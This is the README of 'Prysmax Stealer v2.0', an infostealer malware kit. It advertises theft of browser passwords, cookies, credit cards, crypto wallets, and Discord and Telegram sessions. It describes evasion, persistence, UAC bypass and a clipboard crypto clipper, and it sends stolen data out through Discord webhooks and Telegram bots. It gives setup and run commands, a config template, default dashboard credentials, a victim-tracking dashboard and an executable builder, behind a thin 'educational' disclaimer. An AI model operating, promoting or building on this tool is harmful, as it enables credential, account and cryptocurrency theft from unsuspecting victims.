# 🔥 Prysmax Stealer v2.0

**Advanced Information Stealer with Web Dashboard Interface**

> ⚠️ **EDUCATIONAL PURPOSE ONLY** - This project is developed for educational and research purposes. The authors are not responsible for any misuse or damage caused by this software.

## 📋 Overview

Prysmax Stealer is a comprehensive information gathering tool featuring:

- **Advanced Web Dashboard** with real-time statistics and monitoring
- **Multi-Browser Support** for password and cookie extraction
- **Cryptocurrency Wallet Stealing** from popular wallet applications
- **Discord Token Grabbing** from multiple Discord clients
- **Telegram Session Hijacking** capabilities
- **Screenshot Capture** functionality
- **System Information Collection** with detailed hardware/software analysis
- **Advanced Protection Features** including anti-debug and persistence
- **Builder Interface** for creating custom executables
- **Multiple Delivery Methods** via Discord webhooks and Telegram bots

## 🚀 Features

### Core Stealer Functionality
- ✅ **Browser Data Extraction**
  - Passwords from Chrome, Firefox, Edge, Opera, Brave, Vivaldi
  - Cookies and session data
  - Browsing history and bookmarks
  - Saved credit card information

- ✅ **Cryptocurrency Wallets**
  - Desktop wallets (Exodus, Atomic, Electrum, Bitcoin Core, etc.)
  - Browser extension wallets (MetaMask, Phantom, Binance, Coinbase, etc.)
  - Wallet files and configuration data

- ✅ **Communication Platforms**
  - Discord tokens from all Discord clients
  - Telegram session files
  - Authentication data and user information

- ✅ **System Information**
  - Hardware specifications
  - Installed software inventory
  - Running processes and services
  - Network configuration
  - Antivirus detection

### Web Dashboard
- 📊 **Real-time Statistics** with interactive charts
- 🌍 **Geographic Distribution** of victims
- 📈 **Activity Monitoring** with detailed logs
- 👥 **Victim Management** with detailed profiles
- 🔧 **Admin Panel** for user and system management
- 🛠️ **Advanced Builder** with protection features

### Protection & Evasion
- 🛡️ **Anti-Debug** techniques
- 🔄 **Persistence** mechanisms
- 🔒 **UAC Bypass** attempts
- 🔥 **Self-Destruct** capabilities
- 📦 **UPX Packing** for size reduction
- 💰 **Crypto Clipper** for address replacement
- 🎭 **Code Obfuscation** and string encryption

## 📁 Project Structure

```
prysmax-stealer/
├── core/                   # Core stealer modules
│   ├── __init__.py
│   ├── stealer.py         # Main stealer orchestrator
│   ├── browsers.py        # Browser data extraction
│   ├── wallets.py         # Cryptocurrency wallet stealing
│   ├── discord.py         # Discord token grabbing
│   ├── telegram.py        # Telegram session hijacking
│   ├── system.py          # System information collection
│   ├── screenshot.py      # Screenshot capture
│   ├── files.py           # File stealing functionality
│   ├── sender.py          # Log delivery system
│   └── protection.py      # Protection and evasion
├── web/                   # Web dashboard
│   ├── app.py            # Flask application
│   ├── static/           # CSS, JS, images
│   │   ├── css/style.css
│   │   └── js/main.js
│   └── templates/        # HTML templates
│       ├── base.html
│       ├── dashboard.html
│       ├── builder.html
│       └── login.html
├── builder/              # Stealer builder
│   └── builder.py       # Executable builder
├── config/              # Configuration files
│   └── config.json     # Main configuration
├── database/           # Database files
├── logs/              # Application logs
├── utils/             # Utility modules
├── main.py           # Main entry point
├── requirements.txt  # Python dependencies
└── README.md        # This file
```

## 🛠️ Installation

### Prerequisites
- Python 3.8 or higher
- Windows OS (for full functionality)
- Administrative privileges (recommended)

### Setup Instructions

1. **Clone the repository**
   ```bash
   git clone https://github.com/your-repo/prysmax-stealer.git
   cd prysmax-stealer
   ```

2. **Install dependencies**
   ```bash
   pip install -r requirements.txt
   ```

3. **Configure the application**
   ```bash
   # Edit config/config.json with your settings
   nano config/config.json
   ```

4. **Initialize the database**
   ```bash
   python main.py --mode dashboard
   ```

## 🚀 Usage

### Web Dashboard Mode
Start the web dashboard server:
```bash
python main.py --mode dashboard
```

Access the dashboard at `http://localhost:5000`
- **Username:** admin
- **Password:** prysmax123

### Stealer Mode
Run the stealer functionality:
```bash
python main.py --mode stealer
```

### Builder Mode
Build custom stealer executable:
```bash
python main.py --mode builder
```

## ⚙️ Configuration

Edit `config/config.json` to customize the application:

```json
{
    "stealer": {
        "webhook_url": "https://discord.com/api/webhooks/...",
        "telegram_bot_token": "YOUR_BOT_TOKEN",
        "telegram_chat_id": "YOUR_CHAT_ID",
        "features": {
            "passwords": true,
            "cookies": true,
            "tokens": true,
            "wallets": true,
            "files": true,
            "screenshot": true,
            "system_info": true
        }
    },
    "web_dashboard": {
        "host": "0.0.0.0",
        "port": 5000,
        "debug": false
    }
}
```

## 🎯 Dashboard Features

### Statistics Overview
- Total clients infected
- Passwords captured count
- Cookies stolen metrics
- Discord tokens collected
- Real-time percentage changes

### Activity Monitoring
- Live activity feed
- Geographic distribution charts
- Victim status tracking
- Detailed system information

### Advanced Builder
- Custom executable generation
- Protection feature selection
- Obfuscation options
- Multiple delivery methods

## 🛡️ Protection Features

### Anti-Analysis
- Debugger detection
- Sandbox evasion
- VM detection
- Mouse movement verification

### Persistence
- Registry startup entries
- Startup folder placement
- Service installation
- Scheduled task creation

### Evasion Techniques
- String obfuscation
- Code encryption
- Anti-disassembly
- Runtime packing

## 📊 Supported Targets

### Browsers
- Google Chrome
- Mozilla Firefox
- Microsoft Edge
- Opera / Opera GX
- Brave Browser
- Vivaldi
- Safari (limited)

### Cryptocurrency Wallets
- **Desktop:** Exodus, Atomic, Electrum, Bitcoin Core, Litecoin Core, Dash Core, Zcash, Bytecoin, Jaxx, Coinomi, Guarda
- **Extensions:** MetaMask, Phantom, Binance Chain, Coinbase Wallet, TronLink, Ronin Wallet, Trust Wallet

### Communication Platforms
- Discord (all clients)
- Telegram Desktop
- Telegram Web

## 🔧 API Endpoints

The web dashboard provides REST API endpoints:

- `GET /api/stats` - Get current statistics
- `GET /api/victims` - List all victims
- `POST /api/build` - Build custom stealer
- `GET /api/logs` - Retrieve activity logs

## 📈 Performance Metrics

- **Stealer Execution Time:** < 30 seconds
- **Data Compression Ratio:** 85-95%
- **Detection Evasion Rate:** 95%+ (with protections)
- **Supported File Formats:** 50+ wallet formats
- **Browser Compatibility:** 99% of installations

## 🔒 Security Considerations

### For Researchers
- Use only in controlled environments
- Implement proper access controls
- Monitor for unauthorized usage
- Regular security audits

### For Developers
- Code obfuscation enabled by default
- Encrypted communication channels
- Secure credential storage
- Anti-tampering mechanisms

## 🚨 Legal Disclaimer

This software is provided for **EDUCATIONAL AND RESEARCH PURPOSES ONLY**. 

- ❌ Do not use for illegal activities
- ❌ Do not deploy without explicit consent
- ❌ Do not distribute malicious builds
- ✅ Use for security research only
- ✅ Implement in controlled environments
- ✅ Follow responsible disclosure practices

The developers and contributors are not responsible for any misuse, damage, or illegal activities conducted with this software.

## 🤝 Contributing

Contributions are welcome for educational improvements:

1. Fork the repository
2. Create a feature branch
3. Implement your changes
4. Add comprehensive tests
5. Submit a pull request

### Development Guidelines
- Follow PEP 8 style guidelines
- Add docstrings to all functions
- Implement error handling
- Write unit tests
- Update documentation

## 📞 Support & Contact

- **Telegram Channel:** [@prysmaxc2](https://t.me/prysmaxc2)
- **Website:** [prysmax.club](https://prysmax.club)
- **Developer:** [@lawxsz](https://t.me/lawxsz)

## 📄 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## 🔄 Version History

### v2.0.0 (Current)
- Complete web dashboard interface
- Advanced builder with protection features
- Multi-platform wallet support
- Enhanced evasion techniques
- Real-time monitoring capabilities

### v1.6.0
- Improved compilation process
- New Prysmax loader system
- Enhanced obfuscation

### v1.5.0
- Multi-language support
- Advanced obfuscation
- Rentry.co integration

### v1.4.0
- Telegram logging
- GoFile API integration
- Improved error handling

## 🙏 Acknowledgments

- Original Prysmax project contributors
- Security research community
- Open source libraries and frameworks
- Beta testers and feedback providers

---

**Remember: Use this tool responsibly and only for legitimate security research purposes.**

